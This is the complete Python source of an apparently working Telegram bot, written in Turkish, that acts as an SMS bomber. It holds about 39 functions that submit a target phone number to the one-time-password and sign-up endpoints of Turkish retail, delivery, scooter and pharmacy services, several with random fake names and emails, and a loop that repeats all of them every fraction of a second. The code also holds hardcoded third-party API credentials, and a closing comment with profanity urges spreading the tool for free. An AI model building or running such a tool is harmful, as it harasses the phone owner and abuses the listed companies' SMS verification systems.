import subprocess, sys, os, time, threading, json, random, string, uuid, concurrent.futures
import requests
import telebot
from telebot import types


try:
    import telebot
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
    import telebot



def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {"phone": f"0{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "A101"
    except:
        return False, "A101"

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {"phone": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Bim"
    except:
        return False, "Bim"

def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {"mobilePhone": f"0{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        return (r1 == "IsSMSSend"), "Defacto"
    except:
        return False, "Defacto"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net/"
        payload = {
            "query": """
        mutation SendOtp2($phoneNumber: String!) {
          sendOtp2(phoneNumber: $phoneNumber) {
            alreadySent
            remainingTime
          }
        }""",
            "variables": {"phoneNumber": f"90{number}"}
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "İsteGelsin"
    except:
        return False, "İsteGelsin"

def ikinciyeni(number):
    try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_letters, k=8))}",
            "lastName": f"{''.join(random.choices(string.ascii_letters, k=8))}",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSucceed"]
        return (r1 == True), "İkinci Yeni"
    except:
        return False, "İkinci Yeni"

def migros(number):
    try:
        url = "https://www.migros.com.tr/rest/users/login/otp"
        payload = {"phoneNumber": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]
        return (r1 == True), "Migros"
    except:
        return False, "Migros"

def ceptesok(number):
    try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {"mobile_number": f"{number}", "token_type": "register_token"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Cepte Şok"
    except:
        return False, "Cepte Şok"

def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {
                "phone": f"+90{number}",
                "challenge": f"{uuid.uuid4()}",
                "deviceUniqueId": f"web_{uuid.uuid4()}"
            },
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Tıkla Gelsin"
    except:
        return False, "Tıkla Gelsin"

def bisu(number):
    try:
        url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
        payload = {"phoneNumber": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "BiSU"
    except:
        return False, "BiSU"

def file(number):
    try:
        url = "https://api.filemarket.com.tr/v1/otp/send"
        payload = {"mobilePhoneNumber": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["data"]
        return (r1 == "200 OK"), "File"
    except:
        return False, "File"

def ipragraz(number):
    try:
        url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        payload = {"otp": "", "phoneNumber": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "İpragaz"
    except:
        return False, "İpragaz"

def pisir(number):
    try:
        url = "https://api.pisir.com/v1/login/"
        payload = {"msisdn": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["ok"]
        return (r1 == "1"), "Pişir"
    except:
        return False, "Pişir"

def coffy(number):
    try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload = {"phoneNumber": f"+90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        return (r1 == True), "Coffy"
    except:
        return False, "Coffy"

def sushico(number):
    try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["err"]
        return (r1 == 0), "SushiCo"
    except:
        return False, "SushiCo"

def kalmasin(number):
    try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload = {
            "dil": "tr",
            "device_id": "",
            "notification_mobile": "android-notificationid-will-be-added",
            "platform": "android",
            "version": "2.0.6",
            "login_type": 1,
            "telefon": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        return (r1 == True), "Kalmasın"
    except:
        return False, "Kalmasın"

def yotto(number):
    try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload = {"phone": f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 201), "Yotto"
    except:
        return False, "Yotto"

def qumpara(number):
    try:
        url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
        payload = {"msisdn": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Qumpara"
    except:
        return False, "Qumpara"

def aygaz(number):
    try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload = {"Gsm": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Aygaz"
    except:
        return False, "Aygaz"

def pawapp(number):
    try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload = {
            "languageId": "2",
            "mobileInformation": "",
            "data": {
                "firstName": f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "lastName": f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "userAgreement": "true",
                "kvkk": "true",
                "email": f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                "phoneNo": f"{number}",
                "username": f"{''.join(random.choices(string.ascii_letters + string.digits, k=10))}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        return (r1 == True), "PawAPP"
    except:
        return False, "PawAPP"

def mopas(number):
    try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=2)
            return (r1.status_code == 200), "Mopaş"
        else:
            return False, "Mopaş"
    except:
        return False, "Mopaş"

def paybol(number):
    try:
        url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
        payload = {"otp_code": "null", "phone_number": f"90{number}", "reference_id": "null"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Paybol"
    except:
        return False, "Paybol"

def ninewest(number):
    try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload = {
            "alertMeWithEMail": False,
            "alertMeWithSms": False,
            "dataPermission": True,
            "email": "asdafwqww44wt4t4@gmail.com",
            "genderId": random.randint(0, 3),
            "hash": "5488b0f6de",
            "inviteCode": "",
            "password": f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}",
            "phoneNumber": f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
            "registerContract": True,
            "registerMethod": "mail",
            "version": "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        return (r1 == True), "Nine West"
    except:
        return False, "Nine West"

def saka(number):
    try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload = {"gsm": f"0{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        return (r1 == 1), "Saka"
    except:
        return False, "Saka"

def superpedestrian(number):
    try:
        url = "https://consumer-auth.linkyour.city/consumer_auth/register"
        payload = {"phone_number": f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["detail"]
        return (r1 == "Ok"), "Superpedestrian"
    except:
        return False, "Superpedestrian"

def hayat(number):
    try:
        url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
        r = requests.post(url=url, timeout=5)
        r1 = json.loads(r.text)["IsSuccessful"]
        return (r1 == True), "Hayat"
    except:
        return False, "Hayat"

def tazi(number):
    try:
        url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        payload = {"cep_tel": f"{number}", "cep_tel_ulkekod": "90"}
        headers = {"authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        return (r.status_code == 200), "Tazı"
    except:
        return False, "Tazı"

def gofody(number):
    try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {"country_code": "90", "phone": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        return (r1 == True), "GoFody"
    except:
        return False, "GoFody"

def weescooter(number):
    try:
        url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
        payload = {"tenant": "62a1e7efe74a84ea61f0d588", "gsm": f"{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Wee Scooter"
    except:
        return False, "Wee Scooter"

def scooby(number):
    try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
        r = requests.get(url=url, timeout=5)
        return (r.status_code == 200), "Scooby"
    except:
        return False, "Scooby"

def gez(number):
    try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["succeeded"]
        return (r1 == True), "Gez"
    except:
        return False, "Gez"

def heyscooter(number):
    try:
        url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
        headers = {"user-agent": "okhttp/3.12.1"}
        r = requests.post(url=url, headers=headers, timeout=5)
        r1 = json.loads(r.text)["IsSuccess"]
        return (r1 == True), "Hey Scooter"
    except:
        return False, "Hey Scooter"

def jetle(number):
    try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        return (r.status_code == 200), "Jetle"
    except:
        return False, "Jetle"

def rabbit(number):
    try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload = {
            "mobile_number": f"+90{number}",
            "os_name": "android",
            "os_version": "7.1.2",
            "app_version": " 1.0.2(12)",
            "push_id": "-"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        return (r1 == True), "Rabbit"
    except:
        return False, "Rabbit"

def roombadi(number):
    try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload = {"phone": f"{number}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Roombadi"
    except:
        return False, "Roombadi"

def hizliecza(number):
    try:
        url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
        payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        return (r1 == True), "Hızlı Ecza"
    except:
        return False, "Hızlı Ecza"

def signalall(number):
    try:
        url = "https://appservices.huzk.com/client/register"
        payload = {
            "name": "",
            "phone": {"number": f"{number}", "code": "90", "country_code": "TR", "name": ""},
            "countryCallingCode": "+90",
            "countryCode": "TR",
            "approved": True,
            "notifyType": 99,
            "favorites": [],
            "appKey": "live-exchange"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        return (r1 == True), "SignalAll"
    except:
        return False, "SignalAll"

def goyakit(number):
    try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["data"]["success"]
        return (r1 == True), "Go Yakıt"
    except:
        return False, "Go Yakıt"

def pinar(number):
    try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload = {"MobilePhone": f"{number}"}
        headers = {"devicetype": "android"}
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        
        if r.text == True or r.text == "true":
            return True, "Pınar"
        else:
            return False, "Pınar"
    except:
        return False, "Pınar"

def oliz(number):
    try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload = {"mobile_number": f"{number}", "type": None}
        r = requests.post(url=url, json=payload, timeout=5)
        return (r.status_code == 200), "Oliz"
    except:
        return False, "Oliz"



TOKEN = input(" Token : ")
bot = telebot.TeleBot(TOKEN)


user_data = {}


servis = [
    a101, bim, defacto, istegelsin, ikinciyeni, migros, ceptesok, tiklagelsin,
    bisu, file, ipragraz, pisir, coffy, sushico, kalmasin, yotto, qumpara, aygaz,
    pawapp, mopas, paybol, ninewest, saka, superpedestrian, hayat, tazi, gofody,
    weescooter, scooby, gez, heyscooter, jetle, rabbit, roombadi, hizliecza,
    signalall, goyakit, pinar, oliz
]


def gen_control_markup():
    markup = types.InlineKeyboardMarkup()
    btn_start = types.InlineKeyboardButton("Başlat", callback_data="start")
    btn_stop = types.InlineKeyboardButton("Durdur", callback_data="stop")
    markup.row(btn_start, btn_stop)
    return markup


@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(message.chat.id,
                     "Merhaba 😁 Telefon Numarasi Başında 0 olmadan Gir (örn: 5345678765) : ")


@bot.message_handler(func=lambda message: message.text and message.text.isdigit())
def handle_number(message):
    chat_id = message.chat.id
    number = message.text.strip()
    
    results = {}
    for func in servis:
        
        _, service_name = func(number)
        results[service_name] = {"success": 0, "failure": 0}
        
    user_data[chat_id] = {
        "number": number,
        "results": results,
        "running": False,
        "message_id": None,
        "thread": None
    }
    
    text = f"Numara: {number}\n"
    for service, counts in results.items():
        text += f"{service} - Başarılı ✅: {counts['success']} | Başarısız ❌: {counts['failure']}\n"
    text += "\nLütfen 'Başlat' butonuna basarak gönderime başlayın."
    
    sent_msg = bot.send_message(chat_id, text, reply_markup=gen_control_markup())
    user_data[chat_id]["message_id"] = sent_msg.message_id









def send_sms_loop(chat_id, number):
    global user_data
    while user_data.get(chat_id, {}).get("running", False):
        for func in servis:
            try:
                status, service_name = func(number)
            except:
                status, service_name = False, "Bilinmiyor"
            if chat_id not in user_data:
                return
            if service_name not in user_data[chat_id]["results"]:
                
                user_data[chat_id]["results"][service_name] = {"success": 0, "failure": 0}
            if status:
                user_data[chat_id]["results"][service_name]["success"] += 1
            else:
                user_data[chat_id]["results"][service_name]["failure"] += 1

        
            text = f"Numara: {number}\n"
            for serv, counts in user_data[chat_id]["results"].items():
                text += f"{serv} - Başarılı ✅: {counts['success']} | Başarısız ❌: {counts['failure']}\n"
            text += "\nGönderim devam ediyor..."
            try:
                bot.edit_message_text(chat_id=chat_id,
                                      message_id=user_data[chat_id]["message_id"],
                                      text=text,
                                      reply_markup=gen_control_markup())
            except Exception as e:
                pass
            
            time.sleep(0.2)
        
        time.sleep(0.2)











@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    if chat_id not in user_data:
        bot.answer_callback_query(call.id, "Önce numara gonder 😁")
        return

    if call.data == "start":
        if not user_data[chat_id]["running"]:
            user_data[chat_id]["running"] = True
            t = threading.Thread(target=send_sms_loop, args=(chat_id, user_data[chat_id]["number"]))
            t.daemon = True
            user_data[chat_id]["thread"] = t
            t.start()
            bot.answer_callback_query(call.id, "Gönderim başlatıldı ✅")
        else:
            bot.answer_callback_query(call.id, "Gönderim zaten devam ediyor✅.")
    elif call.data == "stop":
        if user_data[chat_id]["running"]:
            user_data[chat_id]["running"] = False
            bot.answer_callback_query(call.id, "Gönderim durdu❌")
            text = f"Numara: {user_data[chat_id]['number']}\n"
            for serv, counts in user_data[chat_id]["results"].items():
                text += f"{serv} - Başarılı ✅: {counts['success']} | Başarısız ❌: {counts['failure']}\n"
            text += "\nGönderim durdu ❌"
            try:
                bot.edit_message_text(chat_id=chat_id,
                                      message_id=user_data[chat_id]["message_id"],
                                      text=text,
                                      reply_markup=gen_control_markup())
            except Exception as e:
                pass
        else:
            bot.answer_callback_query(call.id, "Gönderim zaten durdu.❌")
if __name__ == '__main__':
    print("Bot çalışıyor...")
    bot.polling(none_stop=True)
    
    
    # Tureme oruspu evlatları 700₺ ye satıyorlar thomas toolda bedava heryeree yayin 😁😂